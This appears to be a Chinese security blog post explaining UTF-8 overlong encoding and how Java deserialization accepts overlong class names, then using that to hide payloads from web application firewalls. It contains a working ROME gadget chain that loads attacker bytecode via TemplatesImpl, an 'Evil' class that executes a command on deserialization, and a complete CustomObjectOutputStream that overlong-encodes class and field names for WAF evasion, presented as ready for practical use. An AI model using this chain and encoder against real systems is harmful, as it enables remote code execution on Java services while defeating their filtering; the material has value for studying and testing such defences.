---
title: "UTF-8 Overlong Encodeing 绕过WAF"
onlyTitle: true
date: 2025-6-13 16:55:26
categories:
- java
- other漏洞
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8162.png
---

# UTF-8 Overlong Encodeing 绕过WAF

## Unicode 到 UTF-8

引用一段来自dicksuck的回答

Unicode 字符到 UTF-8 编码的转换遵循一套清晰但精妙的规则。其核心思想是：**根据 Unicode 码点（Code Point）所处的数值范围，决定使用多少个字节（1 到 4 个）进行编码，并按照特定模式填充这些字节的位。** UTF-8 的设计巧妙地实现了对 ASCII 的完全兼容，并支持表示整个 Unicode 码空间（U+0000 到 U+10FFFF）。

以下是详细的转换步骤和规则：

1. **确定 Unicode 码点：**

   - 每个字符在 Unicode 标准中都有一个唯一的编号，称为码点。
   - 码点通常用十六进制表示，前缀 `U+`。例如：
     - `'A'` (拉丁字母 A) 的码点是 `U+0041`
     - `'€'` (欧元符号) 的码点是 `U+20AC`
     - `'中'` (中文“中”) 的码点是 `U+4E2D`
     - `'😂'` (笑哭表情) 的码点是 `U+1F602`

2. **根据码点范围确定所需字节数：**
   UTF-8 根据码点值的大小将其编码为 1 到 4 个字节。范围划分如下：

   | Unicode 码点范围 (十六进制) | Unicode 码点范围 (十进制) | UTF-8 字节序列 (二进制)               | 所需字节数 |
   | --------------------------- | ------------------------- | ------------------------------------- | ---------- |
   | `U+0000` - `U+007F`         | `0` - `127`               | `0xxxxxxx`                            | 1          |
   | `U+0080` - `U+07FF`         | `128` - `2047`            | `110xxxxx 10xxxxxx`                   | 2          |
   | `U+0800` - `U+FFFF`         | `2048` - `65535`          | `1110xxxx 10xxxxxx 10xxxxxx`          | 3          |
   | `U+10000` - `U+10FFFF`      | `65536` - `1114111`       | `11110xxx 10xxxxxx 10xxxxxx 10xxxxxx` | 4          |

   - **第一列：** Unicode 码点所处的范围。
   - **第二列：** 码点的十进制表示（帮助理解范围大小）。
   - **第三列：** UTF-8 编码的**模板**。`x` 表示用于存放码点二进制位的比特位。
   - **第四列：** 编码这个范围内的码点所需的字节数量。

3. **将码点转换为二进制：**

   - 将码点的十六进制值转换为二进制形式。
   - 根据上一步确定的字节数，**从低位向高位**（从右向左）提取出所需的比特位。如果二进制位数不足模板中 `x` 的总数，则在**高位**（左边）补零。

4. **填充 UTF-8 字节序列模板：**

   - 将上一步提取出的二进制位（包括补的零），**从低位到高位**（从右向左），依次填入模板中 `x` 的位置。
   - **重要规则：**
     - **首字节：** 模板中第一个字节开头的 `1` 的个数（`110...`, `1110...`, `11110...`）明确指示了这个字符使用了多少个字节。`0...` 表示单字节。
     - **后续字节：** 所有后续字节**必须**以 `10` 开头。这是 UTF-8 的一个重要特征，用于区分一个字节是某个字符编码序列的起始字节还是后续字节。

5. **得到最终的 UTF-8 字节序列：**

   - 填充完成后，你就得到了代表该 Unicode 字符的 UTF-8 编码字节序列。这个序列可以存储在文件、网络传输或在内存中表示该字符串。

**详细示例：**

1. **示例 1: `'A'` (U+0041) - 1 字节**
   - 码点： `U+0041` (十六进制) = `65` (十进制)
   - 范围： `0 - 127` -> **1 字节**
   - 模板： `0xxxxxxx`
   - 码点二进制： `65` = `1000001` (二进制，7位)
   - 填充模板： 模板要求 7 个 `x` (`0xxxxxxx`)。将 `1000001` 填入 `x` 的位置 -> `01000001`
   - UTF-8 字节序列 (十六进制)： `0x41` (等同于 ASCII `'A'`)
   - UTF-8 字节序列 (二进制)： `01000001`
2. **示例 2: `'¢'` (分币符号, U+00A2) - 2 字节**
   - 码点： `U+00A2` (十六进制) = `162` (十进制)
   - 范围： `128 - 2047` -> **2 字节**
   - 模板： `110xxxxx 10xxxxxx`
   - 码点二进制： `162` = `10100010` (二进制，8位)
   - 填充模板：
     - 模板 `x` 总位数： 5 (第一个字节) + 6 (第二个字节) = 11 位。
     - 码点二进制 `10100010` 只有 8 位，需要在**高位补 3 个零**： `000 10100010` -> 补零后为 `00010100010` (11位)。
     - 将这 11 位 **从低位到高位** 填入模板的 `x`：
       - 低 6 位 (`100010`) 填入第二个字节的 `10xxxxxx` -> `10100010`
       - 剩下的高 5 位 (`00010`) 填入第一个字节的 `110xxxxx` -> `11000010`
   - UTF-8 字节序列 (十六进制)： `0xC2 0xA2`
   - UTF-8 字节序列 (二进制)： `11000010 10100010`

**示例 3: `'中'` (U+4E2D) - 3 字节**

- 码点： `U+4E2D` (十六进制) = `20013` (十进制)
- 范围： `2048 - 65535` -> **3 字节**
- 模板： `1110xxxx 10xxxxxx 10xxxxxx`
- 码点二进制： `20013` = `0100111000101101` (二进制，16位。十六进制 `4E2D` = `0100 1110 0010 1101`)
- 填充模板：
  - 模板 `x` 总位数： 4 + 6 + 6 = 16 位。码点正好 16 位，无需补零。
  - 将这 16 位 **从低位到高位** 填入模板的 `x`：
    - 低 6 位 (`101101`) 填入第三个字节的 `10xxxxxx` -> `10101101`
    - 中间 6 位 (`111000`) 填入第二个字节的 `10xxxxxx` -> `10111000`
    - 高 4 位 (`0100`) 填入第一个字节的 `1110xxxx` -> `11100100`
- UTF-8 字节序列 (十六进制)： `0xE4 0xB8 0xAD`
- UTF-8 字节序列 (二进制)： `11100100 10111000 10101101`

模板是固定给出的

## Overlong Encoding是什么？

Overlong Encoding就是将1个字节的字符，按照UTF-8编码方式强行编码成2位以上UTF-8字符的方法。

比如点号`.`，其unicode编码和ascii编码一致，均为`0x2E`，按照上表，它只能被编码成单字节的UTF-8字符，按照单字节编码方案：

- `U+002E`的二进制是`101110`
- 模板 `0xxxxxxx`，x 总位数7，高位补0成为`0101110`
- 填入1字节模板：`0xxxxxxx` → `00101110`（十六进制`0x2E`）。

如果强行将`U+002E`（本应用1字节编码）当作一个更大码点（在`U+0080`-`U+07FF`范围内）来处理呢？并使用双字节UTF-8模板编码。

- **步骤**：

  1. **码点值不变**：仍是`U+002E`（二进制`00101110`，但双字节编码需要11位有效负载）。
  2. **高位补0**：为了“适配”双字节范围，在码点高位补0，扩展成11位：`00000101110`（相当于十进制46，但二进制表示为11位：`00000` + `101110`）。
  3. **填入双字节模板**：
     - UTF-8双字节模板：`110xxxxx 10xxxxxx`（用于码点`U+0080`-`U+07FF`）。
     - 高5位（`xxxxx`）取自扩展后的高5位：`00000`。
     - 低6位（`xxxxxx`）取自扩展后的低6位：`101110`。
     - 结果：
       - 第一个字节：`110` + `00000` = `11000000`（十六进制`0xC0`）。
       - 第二个字节：`10` + `101110` = `10101110`（十六进制`0xAE`）。

  - 最终序列：`0xC0 0xAE`。

**关键问题：这个序列是否有效？**

- **绝对无效，且违反UTF-8标准**。
  - **原因1：违反“最短形式”规则（Shortest Form Requirement）**：
    - UTF-8标准强制要求字符必须使用最小可能字节数编码。`U+002E`完全可以用1字节（`0x2E`）表示，使用双字节（`0xC0 0xAE`）是“过长编码”（Overlong Encoding）。
    - 正规UTF-8解码器（如Python、Java、现代浏览器）会将其视为非法序列，并抛出错误或替换为占位符（如`�`）。
  - **原因2：码点范围不匹配**：
    - 双字节UTF-8序列仅适用于码点`U+0080`及以上（≥128）。`U+002E`（46）小于128，不属于该范围。
  - **原因3：安全性风险**：
    - 这种序列可能被恶意利用（如注入攻击）。历史上，某些旧系统（如早期Internet Explorer）错误地将`0xC0 0xAE`解释为点号，允许攻击者绕过安全检查（例如，在URL中编码`../`为`%C0%AE%C0%AE%2F`实现目录遍历）。但现代系统已修复此问题。

现代UTF-8解码器（如Python的`decode('utf-8')`、JavaScript的`TextDecoder`）会检测到`0xC0 0xAE`是过长序列，并报错：

```python
b'\xC0\xAE'.decode('utf-8')  # 抛出 UnicodeDecodeError: invalid start byte
```

但是在Java中，就可能存在问题

## 场景

比如随便找个rome链，我们对其序列化

```java
package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Hashtable;
//BadAttributeValueExpException.readObject()
//ToStringBean.toString()
//ToStringBean.toString(String)
//TemplatesImpl.getOutputProperties()
public class Rome_BadAttributeValueExpException {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesClass);//防止提前触发
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, toStringBean);
        serialize(badAttributeValueExpException);
//        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

序列化后如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613151824867.png)

很显然WAF不会对乱码进行进行匹配，而是对可见字符进行匹配

如果我们能利用解析问题去让我们的可见字符也变成乱码，使WAF不能识别，而程序能顺利进行，就顺利的达到了目标

## 实现

1ue1uekin8找到了readObject中对类名的解析

上面的demo readObject有很多嵌套，不太适合调试，我们用一个简单的Evil demo调试

```java
package org.example.TestCode;

import java.io.IOException;
import java.io.Serializable;

public class Evil implements Serializable {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static void main(String[] args) throws Exception {
        Evil evil = new Evil();
        serialize(evil);
        Object obj = unserialize("ser.bin");
        System.out.println(obj);
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

跟进readObject，经过如下栈，来到readUTFSpan

```java
readUTFSpan:3625, ObjectInputStream$BlockDataInputStream (java.io)
readUTFBody:3596, ObjectInputStream$BlockDataInputStream (java.io)
readUTF:3400, ObjectInputStream$BlockDataInputStream (java.io)
readUTF:1210, ObjectInputStream (java.io)
readNonProxy:768, ObjectStreamClass (java.io)
readClassDescriptor:968, ObjectInputStream (java.io)
readNonProxyDesc:2000, ObjectInputStream (java.io)
readClassDesc:1875, ObjectInputStream (java.io)
readOrdinaryObject:2209, ObjectInputStream (java.io)
readObject0:1692, ObjectInputStream (java.io)
readObject:508, ObjectInputStream (java.io)
readObject:466, ObjectInputStream (java.io)
unserialize:30, Evil (org.example.TestCode)
main:17, Evil (org.example.TestCode)
```

readUTFSpan完成了从字节缓冲区中读取一段UTF-8编码的字符串，转换为字符并追加到StringBuilder中，返回实际读取的字节数。

从代码注释我们可以看出，取出当前字节的高4位去判定属于哪个模板。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153140853.png)

buf[pos++]：从缓冲区中取出当前 pos 位置的字节，并将 pos 后移一位；
& 0xFF：将字节值无符号扩展为 int，确保结果为 0~255 的非负整数。

`>>`代表高4位

看代码可以知道，只对模板进行了判断就继续解析了。比如双字节的判定，先判断第一个字节是否为`1110xxxxx`模板，然后判断第二个字节是否为`10xxxxxx`。可以看到并没有去判断我们上面所说的像python一样验证码点范围是否处于对应的区间。

### 构造

我们试着把org.example.Evil的第一个字符o进行双字节UTF-8混淆，其16进制为0x6f

如果是单字节的情况，o会以`0xxxxxxx`的模板去解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153831825.png)

我们改造成用双字节的模板去解析：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153916272.png)

我们把对应的6F(01101111)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613154335870.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613154515707.png)

双字节模板110xxxxx 10xxxxxx

填充11101111后，得到o的双字节 11100001 101101111，也就是16进制的C1 AF

（本插件按Insert后开启插入模式修改数据）

修改后可以看到已经变成了乱码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613155546316.png)

我们保存后继续反序列化。

控制台进行了报错：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613155823491.png)

因为我们把一个字节改成了两个字节的原因，utflen却没变，导致提前结束了对类名的读取

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160134433.png)

修改后即顺利读取

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160512708.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160623993.png)

这样就能实现反序列化的同时字节码不可被WAF读取

### 工程化利用

我们跟进writeObject到writeNonProxy

```java
writeNonProxy:818, ObjectStreamClass (java.io)
writeClassDescriptor:668, ObjectOutputStream (java.io)
writeNonProxyDesc:1282, ObjectOutputStream (java.io)
writeClassDesc:1231, ObjectOutputStream (java.io)
writeOrdinaryObject:1427, ObjectOutputStream (java.io)
writeObject0:1178, ObjectOutputStream (java.io)
writeObject:348, ObjectOutputStream (java.io)
serialize:24, Evil (org.example.TestCode)
main:16, Evil (org.example.TestCode)
```

可以看到这里调用的writeUTF去写入的类名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613162036367.png)

把writeUTF修改如下：

```java
        String name = desc.getName();
//        writeUTF(desc.getName());
        writeShort(name.length() * 2);
        for (int i = 0; i < name.length(); i++) {
            char s = name.charAt(i);
//            System.out.println(s);
            write(map.get(s)[0]);
            write(map.get(s)[1]);
        }
```

因为writeNonProxy是privite方法，可以直接重载ObjectOutputStream.writeClassDescriptor，除了修改开始的writeUTF，剩下的部分继续粘贴进去就行了

```java
package org.exploit.misc;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;

public class CustomObjectOutputStream extends ObjectOutputStream {

    private static HashMap<Character, int[]> map;
    static {
        map = new HashMap<>();
        map.put('_', new int[]{0xc1, 0x9f});
        map.put('.', new int[]{0xc0, 0xae});
        map.put(';', new int[]{0xc0, 0xbb});
        map.put('$', new int[]{0xc0, 0xa4});
        map.put('[', new int[]{0xc1, 0x9b});
        map.put(']', new int[]{0xc1, 0x9d});
        map.put('a', new int[]{0xc1, 0xa1});
        map.put('b', new int[]{0xc1, 0xa2});
        map.put('c', new int[]{0xc1, 0xa3});
        map.put('d', new int[]{0xc1, 0xa4});
        map.put('e', new int[]{0xc1, 0xa5});
        map.put('f', new int[]{0xc1, 0xa6});
        map.put('g', new int[]{0xc1, 0xa7});
        map.put('h', new int[]{0xc1, 0xa8});
        map.put('i', new int[]{0xc1, 0xa9});
        map.put('j', new int[]{0xc1, 0xaa});
        map.put('k', new int[]{0xc1, 0xab});
        map.put('l', new int[]{0xc1, 0xac});
        map.put('m', new int[]{0xc1, 0xad});
        map.put('n', new int[]{0xc1, 0xae});
        map.put('o', new int[]{0xc1, 0xaf}); // 0x6f
        map.put('p', new int[]{0xc1, 0xb0});
        map.put('q', new int[]{0xc1, 0xb1});
        map.put('r', new int[]{0xc1, 0xb2});
        map.put('s', new int[]{0xc1, 0xb3});
        map.put('t', new int[]{0xc1, 0xb4});
        map.put('u', new int[]{0xc1, 0xb5});
        map.put('v', new int[]{0xc1, 0xb6});
        map.put('w', new int[]{0xc1, 0xb7});
        map.put('x', new int[]{0xc1, 0xb8});
        map.put('y', new int[]{0xc1, 0xb9});
        map.put('z', new int[]{0xc1, 0xba});
        map.put('A', new int[]{0xc1, 0x81});
        map.put('B', new int[]{0xc1, 0x82});
        map.put('C', new int[]{0xc1, 0x83});
        map.put('D', new int[]{0xc1, 0x84});
        map.put('E', new int[]{0xc1, 0x85});
        map.put('F', new int[]{0xc1, 0x86});
        map.put('G', new int[]{0xc1, 0x87});
        map.put('H', new int[]{0xc1, 0x88});
        map.put('I', new int[]{0xc1, 0x89});
        map.put('J', new int[]{0xc1, 0x8a});
        map.put('K', new int[]{0xc1, 0x8b});
        map.put('L', new int[]{0xc1, 0x8c});
        map.put('M', new int[]{0xc1, 0x8d});
        map.put('N', new int[]{0xc1, 0x8e});
        map.put('O', new int[]{0xc1, 0x8f});
        map.put('P', new int[]{0xc1, 0x90});
        map.put('Q', new int[]{0xc1, 0x91});
        map.put('R', new int[]{0xc1, 0x92});
        map.put('S', new int[]{0xc1, 0x93});
        map.put('T', new int[]{0xc1, 0x94});
        map.put('U', new int[]{0xc1, 0x95});
        map.put('V', new int[]{0xc1, 0x96});
        map.put('W', new int[]{0xc1, 0x97});
        map.put('X', new int[]{0xc1, 0x98});
        map.put('Y', new int[]{0xc1, 0x99});
        map.put('Z', new int[]{0xc1, 0x9a});
    }
    public CustomObjectOutputStream(OutputStream out) throws IOException {
        super(out);
    }

    @Override
    protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException {
        String name = desc.getName();
//        writeUTF(desc.getName());
        writeShort(name.length() * 2);
        for (int i = 0; i < name.length(); i++) {
            char s = name.charAt(i);
//            System.out.println(s);
            write(map.get(s)[0]);
            write(map.get(s)[1]);
        }
        writeLong(desc.getSerialVersionUID());
        try {
            byte flags = 0;
            if ((boolean)getFieldValue(desc,"externalizable")) {
                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;
                Field protocolField = ObjectOutputStream.class.getDeclaredField("protocol");
                protocolField.setAccessible(true);
                int protocol = (int) protocolField.get(this);
                if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) {
                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;
                }
            } else if ((boolean)getFieldValue(desc,"serializable")){
                flags |= ObjectStreamConstants.SC_SERIALIZABLE;
            }
            if ((boolean)getFieldValue(desc,"hasWriteObjectData")) {
                flags |= ObjectStreamConstants.SC_WRITE_METHOD;
            }
            if ((boolean)getFieldValue(desc,"isEnum") ) {
                flags |= ObjectStreamConstants.SC_ENUM;
            }
            writeByte(flags);
            ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc,"fields");
            writeShort(fields.length);
            for (int i = 0; i < fields.length; i++) {
                ObjectStreamField f = fields[i];
                writeByte(f.getTypeCode());
//                writeUTF(f.getName());
                String fname = f.getName();
                writeShort(fname.length() * 2);
                for (int j = 0; j < fname.length(); j++) {
                    char s = fname.charAt(j);
//            System.out.println(s);
                    write(map.get(s)[0]);
                    write(map.get(s)[1]);
                }
                if (!f.isPrimitive()) {
                    Method writeTypeString = ObjectOutputStream.class.getDeclaredMethod("writeTypeString",String.class);
                    writeTypeString.setAccessible(true);
                    writeTypeString.invoke(this,f.getTypeString());
//                    writeTypeString(f.getTypeString());
                }
            }
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        }
    }

    public static Object getFieldValue(Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Class<?> clazz = object.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object value = field.get(object);

        return value;
    }
}
```

```java
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new CustomObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
```

不过这里只修改了各个类名为不可读，接口还没修改，不过WAF大概率也是拦截类名。

我们还可以进一步把接口也给做相同的修改，只需要在writeUTF打上断点，看哪些地方调用了它写入数据

找到了writeNonProxy中写入字段UTF的代码，把这里也修改（额外添加下划线的map）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613162550376.png)

```java
package org.example.TestCode;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;

public class CustomObjectOutputStream extends ObjectOutputStream {

    private static HashMap<Character, int[]> map;
    static {
        map = new HashMap<>();
        map.put('.', new int[]{0xc0, 0xae});
        map.put(';', new int[]{0xc0, 0xbb});
        map.put('$', new int[]{0xc0, 0xa4});
        map.put('[', new int[]{0xc1, 0x9b});
        map.put(']', new int[]{0xc1, 0x9d});
        map.put('a', new int[]{0xc1, 0xa1});
        map.put('b', new int[]{0xc1, 0xa2});
        map.put('c', new int[]{0xc1, 0xa3});
        map.put('d', new int[]{0xc1, 0xa4});
        map.put('e', new int[]{0xc1, 0xa5});
        map.put('f', new int[]{0xc1, 0xa6});
        map.put('g', new int[]{0xc1, 0xa7});
        map.put('h', new int[]{0xc1, 0xa8});
        map.put('i', new int[]{0xc1, 0xa9});
        map.put('j', new int[]{0xc1, 0xaa});
        map.put('k', new int[]{0xc1, 0xab});
        map.put('l', new int[]{0xc1, 0xac});
        map.put('m', new int[]{0xc1, 0xad});
        map.put('n', new int[]{0xc1, 0xae});
        map.put('o', new int[]{0xc1, 0xaf}); // 0x6f
        map.put('p', new int[]{0xc1, 0xb0});
        map.put('q', new int[]{0xc1, 0xb1});
        map.put('r', new int[]{0xc1, 0xb2});
        map.put('s', new int[]{0xc1, 0xb3});
        map.put('t', new int[]{0xc1, 0xb4});
        map.put('u', new int[]{0xc1, 0xb5});
        map.put('v', new int[]{0xc1, 0xb6});
        map.put('w', new int[]{0xc1, 0xb7});
        map.put('x', new int[]{0xc1, 0xb8});
        map.put('y', new int[]{0xc1, 0xb9});
        map.put('z', new int[]{0xc1, 0xba});
        map.put('A', new int[]{0xc1, 0x81});
        map.put('B', new int[]{0xc1, 0x82});
        map.put('C', new int[]{0xc1, 0x83});
        map.put('D', new int[]{0xc1, 0x84});
        map.put('E', new int[]{0xc1, 0x85});
        map.put('F', new int[]{0xc1, 0x86});
        map.put('G', new int[]{0xc1, 0x87});
        map.put('H', new int[]{0xc1, 0x88});
        map.put('I', new int[]{0xc1, 0x89});
        map.put('J', new int[]{0xc1, 0x8a});
        map.put('K', new int[]{0xc1, 0x8b});
        map.put('L', new int[]{0xc1, 0x8c});
        map.put('M', new int[]{0xc1, 0x8d});
        map.put('N', new int[]{0xc1, 0x8e});
        map.put('O', new int[]{0xc1, 0x8f});
        map.put('P', new int[]{0xc1, 0x90});
        map.put('Q', new int[]{0xc1, 0x91});
        map.put('R', new int[]{0xc1, 0x92});
        map.put('S', new int[]{0xc1, 0x93});
        map.put('T', new int[]{0xc1, 0x94});
        map.put('U', new int[]{0xc1, 0x95});
        map.put('V', new int[]{0xc1, 0x96});
        map.put('W', new int[]{0xc1, 0x97});
        map.put('X', new int[]{0xc1, 0x98});
        map.put('Y', new int[]{0xc1, 0x99});
        map.put('Z', new int[]{0xc1, 0x9a});
    }
    public CustomObjectOutputStream(OutputStream out) throws IOException {
        super(out);
    }

    @Override
    protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException {
        String name = desc.getName();
//        writeUTF(desc.getName());
        writeShort(name.length() * 2);
        for (int i = 0; i < name.length(); i++) {
            char s = name.charAt(i);
//            System.out.println(s);
            write(map.get(s)[0]);
            write(map.get(s)[1]);
        }
        writeLong(desc.getSerialVersionUID());
        try {
            byte flags = 0;
            if ((boolean)getFieldValue(desc,"externalizable")) {
                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;
                Field protocolField = ObjectOutputStream.class.getDeclaredField("protocol");
                protocolField.setAccessible(true);
                int protocol = (int) protocolField.get(this);
                if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) {
                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;
                }
            } else if ((boolean)getFieldValue(desc,"serializable")){
                flags |= ObjectStreamConstants.SC_SERIALIZABLE;
            }
            if ((boolean)getFieldValue(desc,"hasWriteObjectData")) {
                flags |= ObjectStreamConstants.SC_WRITE_METHOD;
            }
            if ((boolean)getFieldValue(desc,"isEnum") ) {
                flags |= ObjectStreamConstants.SC_ENUM;
            }
            writeByte(flags);
            ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc,"fields");
            writeShort(fields.length);
            for (int i = 0; i < fields.length; i++) {
                ObjectStreamField f = fields[i];
                writeByte(f.getTypeCode());
//                writeUTF(f.getName());
                String fname = f.getName();
                writeShort(fname.length() * 2);
                for (int j = 0; j < fname.length(); j++) {
                    char s = fname.charAt(j);
//            System.out.println(s);
                    write(map.get(s)[0]);
                    write(map.get(s)[1]);
                }
                if (!f.isPrimitive()) {
                    Method writeTypeString = ObjectOutputStream.class.getDeclaredMethod("writeTypeString",String.class);
                    writeTypeString.setAccessible(true); 
                    writeTypeString.invoke(this,f.getTypeString()); 
//                    writeTypeString(f.getTypeString());
                }
            }
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        }
    }

    public static Object getFieldValue(Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Class<?> clazz = object.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object value = field.get(object);

        return value;
    }
}
```

### 测试

可以看到Evil类序列化出来已经完全成为了依托乱码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613163112396.png)

以rome链做一个测试：

可以看到其中用到的类和字段（比如val，_beanClass）都变成了乱码，但仍然可以反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613164721882.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613164647233.png)

这种方式不会影响作用在java层阻断，比如resolveClass、RASP，是一种针对WAF的特定绕过。但是很有效，膜烧麦✌





参考：

https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html

https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd